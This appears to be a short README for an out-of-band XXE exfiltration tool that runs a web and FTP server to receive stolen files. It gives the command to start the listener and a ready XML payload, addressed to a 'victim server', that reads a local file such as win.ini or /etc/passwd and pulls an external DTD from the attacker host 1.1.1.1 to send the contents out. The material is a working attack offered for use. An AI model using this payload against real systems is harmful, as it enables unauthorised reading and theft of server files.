# xxe-ftp-server
xxe oob receive file via web and ftp server



### Step 1:

**run script:**

```bash
python2 xxe-ftp-server.py public-ip-address web-port ftp-port
```

such as:

```
python2 xxe-ftp-server.py 1.1.1.1 80 2121
```



### Step 2:

**send xxe payload to victim server:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
  <!ENTITY % file SYSTEM "file:///c:/windows/win.ini">
  <!ENTITY % dtd SYSTEM "http://1.1.1.1:80/data.dtd"> %dtd;
]>
<data>&send;</data>
```



`c:/windows/win.ini` is read file path，such as `etc/passwd`

`1.1.1.1:80` is `public-server-ip and web-bind-port`

